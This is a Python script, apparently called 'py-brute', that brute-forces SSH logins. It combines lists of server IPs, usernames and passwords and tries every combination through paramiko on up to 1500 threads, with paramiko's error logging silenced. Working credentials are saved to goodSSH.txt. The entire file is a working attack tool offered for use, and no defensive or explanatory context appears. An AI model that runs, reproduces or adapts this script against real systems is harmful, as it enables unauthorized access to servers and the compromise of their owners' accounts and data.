import os
import sys
import time
import logging
from tqdm import tqdm
from threading import Thread
import paramiko

print("""
                                 █████                           █████
                                ░░███                           ░░███
 ████████  █████ ████            ░███████  ████████  █████ ████ ███████    ██████
░░███░░███░░███ ░███  ██████████ ░███░░███░░███░░███░░███ ░███ ░░░███░    ███░░███
 ░███ ░███ ░███ ░███ ░░░░░░░░░░  ░███ ░███ ░███ ░░░  ░███ ░███   ░███    ░███████
 ░███ ░███ ░███ ░███             ░███ ░███ ░███      ░███ ░███   ░███ ███░███░░░
 ░███████  ░░███████             ████████  █████     ░░████████  ░░█████ ░░██████
 ░███░░░    ░░░░░███            ░░░░░░░░  ░░░░░       ░░░░░░░░    ░░░░░   ░░░░░░
 ░███       ███ ░███
 █████     ░░██████
░░░░░       ░░░░░░
""")


logging.getLogger("paramiko").setLevel(logging.CRITICAL)

def check_cred(cred, good_creds, bad_creds, num_lines, start_time, i, pbar):
    ip, user, password = cred.split(";", 2)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, username=user, password=password, timeout=timeout)
        good_creds.append(cred)
        pbar.set_description(f"Creds: {num_lines} | ETA: {((time.time()-start_time)/(i+1))*(num_lines-i-1)/60:.2f} minutes | Tried: {i+1} | Good: {len(good_creds)} | Bad: {len(bad_creds)}")
        ssh.close()
    except Exception as e:
        bad_creds.append(cred)
        pbar.set_description(f"Creds: {num_lines} | ETA: {((time.time()-start_time)/(i+1))*(num_lines-i-1)/60:.2f} minutes | Tried: {i+1} | Good: {len(good_creds)} | Bad: {len(bad_creds)}")
    pbar.update(1)

while True:
    ip_file = input("Servers file: ")
    if not os.path.exists(ip_file):
        print("Error!")
    else:
        break

while True:
    user_file = input("Users file: ")
    if not os.path.exists(user_file):
        print("Error!")
    else:
        break

while True:
    pass_file = input("Password file: ")
    if not os.path.exists(pass_file):
        print("Error!")
    else:
        break

while True:
    timeout_str = input("Timeout: ")
    if not timeout_str.isdigit() or int(timeout_str) < 1:
        print("Error!")
    else:
        timeout = int(timeout_str)
        break

while True:
    num_threads_str = input("Threads: ")
    if not num_threads_str.isdigit() or int(num_threads_str) < 1 or int(num_threads_str) > 1500:
        print("Error!")
    else:
        num_threads = int(num_threads_str)
        break

with open(ip_file) as f:
    ip_list = f.read().splitlines()
with open(user_file) as f:
    user_list = f.read().splitlines()
with open(pass_file) as f:
    pass_list = f.read().splitlines()

creds = []
for ip in ip_list:
    for user in user_list:
        for password in pass_list:
            creds.append(f"{ip};{user};{password}")
with open("creds.txt", "w") as f:
    f.write("\n".join(creds))

num_lines = len(creds)
est_time = num_lines * 5 / 60
stats_str = f"Creds: {num_lines} | ETA: {est_time:.2f} minutes | Tried: 0 | Good: 0 | Bad: 0"
pbar = tqdm(total=num_lines, desc=stats_str, unit="credential")

good_creds = []
bad_creds = []
start_time = time.time()

threads = []
for i, cred in enumerate(creds):
    thread = Thread(target=check_cred, args=(cred, good_creds, bad_creds, num_lines, start_time, i, pbar))
    threads.append(thread)
    if len(threads) == num_threads:
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        threads = []

for t in threads:
    t.start()
for t in threads:
    t.join()

with open("goodSSH.txt", "w") as f:
    f.write("\n".join(good_creds))
with open("badSSH.txt", "w") as f:
    f.write("\n".join(bad_creds))

num_good_creds = len(good_creds)
num_bad_creds = len(bad_creds)
stats_str = f"Creds: {num_lines} | ETA: Done | Tried: {num_lines} | Good: {num_good_creds} | Bad: {num_bad_creds}"
pbar.set_description(stats_str)
pbar.close()
